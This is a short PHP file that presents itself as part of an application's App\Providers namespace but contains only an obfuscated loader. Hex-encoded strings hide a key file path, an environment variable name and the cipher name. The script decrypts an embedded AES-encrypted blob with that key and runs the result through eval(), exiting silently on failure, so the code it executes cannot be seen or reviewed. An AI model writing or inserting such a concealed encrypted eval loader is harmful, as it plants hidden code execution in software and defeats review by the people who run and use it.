<?php
namespace App\Providers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('2vSbjDE1c2lq87caB+DI2A==');

$c=base64_decode(

'VuZb6jxxZxzyEQh9ji0gI4DDZQTkFGlROA2m9h9jRNx/nKDtkOwlGWleBIQou8EDUReJabQtNWD9' .
'8TcPQHVgIG7ETVTx85bMPQdbF5SRgR2M9iYzrcOqG9H8RxDFZCGNWHYThY+U57zUGYkM0avR9AHQ' .
'gJjPvh28yiYeLOrZRRtl0mMMupgU9KS5PLIAuTtiZTOzPM+zDn+aLsS6X3CC8pydH946vZ0m5hKY' .
'aGa6qoozU8UHHXP3Pfv5TJVFgAsCCsaaX2KnzqD3X/J1Tk7+/BtolrqADRa8oamWgGWTMOH7+Wgk' .
'iMK22tctooYF6E/35HJSjcJ3inw1/wZMhY2Eg7BMIkTHHdTYanutcDr8M5eXG4X8TdMft17wMvCR' .
'2VSH8R46K4Cc7H/uRExUqItU8ZVpSm6Z5WjrRbTOSximZeov/HNsPaXFNGcB4vbEKf40+PRq/Dly' .
'8AJDPOjgCMnUy6tyq3jFjzS8gOeGyTQ9yrqQSn+dgilT4EPJyi05rmX1kXYzTCDP85vkpEFLihjP' .
'krxKAPodttL3YC7y6lL5P68xG/rlwP5+2mzMy01fN1RtRp6PAnVcgQxbj/kAz1eeijx9L2ttaXBG' .
'6FJK46oxQe2vltk5thPfmwApR7IBEWAK5quC9BEHbLUksB3zUcUogq386SALn7VUDIaiFokAJFqu' .
'oUnbxSJ15gHZbFrLSahx64Q09byxGgyNu1wfyJCbZ0ZRrdwUZGqUDCeZIfjiY2LA5bHfIj7SIFHq' .
'b/dFotik09KEe5HDfD7Txr1zPW3XyLaMj8J0bAvXzAa0JNwnMo2i2LL9hE6XhpOQfhKW07WlRAnx' .
'0xGHSoLIvacw5Nx2pgmKtOexSQew5df6HaJWxPkMTZ2jbStWuiCEEtKyH11C4tsKfYDCHhEZveEA' .
'PydzF8KbvaCET2vRRD9Z51CIbvj8XLl8w4zfH+Wb5EWSz7g8'

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

